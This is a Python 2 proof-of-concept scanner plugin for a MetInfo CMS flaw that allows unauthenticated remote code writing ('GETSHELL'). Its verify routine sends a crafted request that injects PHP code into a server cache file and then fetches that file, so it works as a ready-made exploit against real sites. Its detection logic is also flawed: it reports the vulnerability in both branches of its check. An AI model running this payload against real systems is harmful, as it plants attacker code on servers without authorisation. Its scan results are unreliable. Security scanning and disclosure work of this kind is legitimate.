# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'b65f7fde-bc57-45b3-8677-cb1d09cfe0b6'
    name = 'MetInfo 无需登录前台直接GETSHELL' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-05-03'  # 漏洞公布时间
    desc = '''
        MetInfo 无需登录前台直接GETSHELL
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=094886' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e0fa2ec0-f9ce-4b0a-81f7-92a7e3ba6af1'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload1 = '/admin/include/common.inc.php?met_admin_type_ok=1&langset=123&met_langadmin[123][]=12345&str=phpinfo%28%29%3B%3F%3E%2f%2f'
            payload2 = '/cache/langadmin_123.php' 
            url1 = arg + payload1
            url2 = arg + payload2
            code1, head1, res1, errcode1, _ = hh.http(url1)
            code2, head2, res2, errcode2, _ = hh.http(url2)           
            if code2 == '200' and code1 == '200':
                if res1.find('System') != -1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
                else:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
        
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()